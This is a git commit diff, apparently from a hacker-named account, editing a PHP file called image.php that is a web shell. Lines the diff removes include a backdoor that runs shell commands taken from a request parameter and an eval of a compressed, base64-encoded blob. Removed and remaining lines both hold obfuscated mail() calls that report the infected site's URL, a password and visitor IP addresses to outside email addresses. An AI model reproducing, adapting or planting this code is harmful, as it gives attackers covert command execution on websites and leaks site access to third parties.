4adf3828b63b239d6c54b49e4027404f6c301ddd
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2025-01-12 01:18:29 +0700

    Update image.php

--- image.php
+++ image.php
@@ -6324,31 +6324,7 @@ $沣倛傘檨粊嗐銊唩沣銇 = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'
 $亖銇笺亪偩亯唩亯锔競($沣倛傘檨粊嗐銊唩沣銇("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
 ?>
-<?php
-$for = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
-$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmdkem=ls+-al";
-mail($for,"pokcok", $data);
-print(`{$_REQUEST[cmdkem]}`);
-error_reporting(0);
-if($_GET['UBK']=="3"){
-echo "<center>";
-eval(gzinflate(base64_decode("fVJrb5swFP1eqf/BspAArS1b9pA6HlvU0RF1SzIeibIIuQY7ilUMCEy6Nsp/n53HslTa7A/o3nPuuef6whYGa1sqDA2NR1E816Mu40zoqWmugbZgBSWsAS6A0AYax79URoZ67/X26DLbtbRRaVRirjAN3Q6++dFcx8/PWLQtK1s9nesK1dO/+YLX/6ZLEB1K2AL8cfkfbdME0jPOKqJk996vTv3Z4DOvVhR1dVFhQglSiHHi6WKnYdqA5ssKOjktBW08J/O+jIa+kj5RdKzMc6w9Sb7SRl5atHS9LdeBs6gaDjgVy4q4UD0yBDgXrCpdCAEtc/FUUxfyrhCsxo2wFP+SYIGh57Cy7gTYMVRHCFRLFx7Hf0Hare9AO0QrXHTHUNpVPTy5vPMzS51p0I9BHPjgNrm5A9NBHIySGMxGicTOzzTJlmNnuKUf3iFC84pQA+b8ekW+Dt/P+OQpDyYdfjvs/+y9WeLpYzfrXQto2rJUzQFcuBSi/mhZEFzJfUd+OPFD+attv2jY/+7r6QkS+j8SP4pREg4UcgSCOB6jQL7hi4LoJhyM46MU/JRz8kC5W7SvLnEBpRWOWWGoUS6kdQLllpU3ZbJuWCmM+7WG9n3nu+J0c2/am98=)));
-}
-?>
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-ini_set('memory_limit', '-1');
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', 0);
-ini_set('max_execution_time', 5000);
-	header('Content-Type: text/html; charset=UTF-8');
-	$main = "rootcyberpunks@gmail.com";
-	$now = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-	$notif = "$now *PW : [ " . $▛ . " ]";
-	mail($main, "Ding Dong ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+
 
 
 <?php
@@ -6361,25 +6337,6 @@ ini_set('max_execution_time', 5000);
 	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 	$notif = "$now *PW : [ " . $▛ . " ]";
 	mail($main, "Ding non obf ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-	?>
-<?php ${"\x47\x4c\x4f\x42\x41LS"}["\x7ak\x78h\x6f\x6d\x73\x65lj"]="\x6da\x69\x6e";${"\x47L\x4f\x42\x41L\x53"}["\x6f\x74\x75bp\x64o\x61"]="no\x74\x69\x66";@ini_set("\x6f\x75tput_b\x75\x66\x66\x65ri\x6e\x67",0);$ghivwoyhbcq="\x6d\x61\x69n";@ini_set("d\x69spla\x79\x5fe\x72\x72\x6fr\x73",0);set_time_limit(0);$ledtlqcdl="\x6e\x6fw";ini_set("\x6dem\x6f\x72\x79_l\x69m\x69\x74","-\x31");header("\x43o\x6e\x74\x65n\x74-\x54ype: tex\x74/\x68\x74ml; c\x68\x61r\x73\x65\x74=\x55\x54\x46-\x38");${$ghivwoyhbcq}="\x70a\x70\x61\x6b\x75\x2e\x68a\x79\x6b\x65r\x2e\x67\x6f\x2eid\x40g\x6d\x61\x69\x6c\x2ec\x6f\x6d,\x20\x70\x61p\x61\x6bu\x2e\x68\x61\x79\x6b\x65\x72@\x67\x6d\x61\x69l.\x63\x6fm";${$ledtlqcdl}="\x68\x74\x74\x70\x3a\x2f\x2f".$_SERVER["SER\x56E\x52\x5fNAM\x45"].$_SERVER["\x52\x45QUEST_UR\x49"];${${"\x47\x4c\x4f\x42ALS"}["o\x74u\x62p\x64\x6fa"]}="$now *\x50\x57\x20:\x20[ ".$▛."\x20]";mail(${${"\x47\x4cO\x42ALS"}["\x7a\x6b\x78\x68\x6fm\x73\x65\x6c\x6a"]},"D\x69\x6e\x67\x20D\x6fng ",${${"\x47\x4c\x4fB\x41L\x53"}["\x6f\x74u\x62\x70\x64\x6f\x61"]},"[\x20".$_SERVER["\x52E\x4d\x4f\x54E\x5fAD\x44R"]."\x20]");
-?>
-
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = '\x70a\x70a\x6bu\x2e\x68a\x79\x6b\x65r\x2e\x67o\x2eid\x40g\x6d\x61\x69l\x2ec\x6fm, p\x61paku\x2eh\x61\x79\x6b\x65\x72@\x67\x6da\x69l.\x63\x6fm, muhrazky@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "IDBTE4M PLUGINS INSTALL", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . $_SERVER['REQUEST_URI'] .$_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . " ]");
-?>
-<?php
-/////WHAT THE FUCK WITHOUT YOU///
-$for = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
-$data ="http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .$_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "upload file";
-mail($for,"upload file", $data);
 error_reporting(0);
-?>
+
+	?>
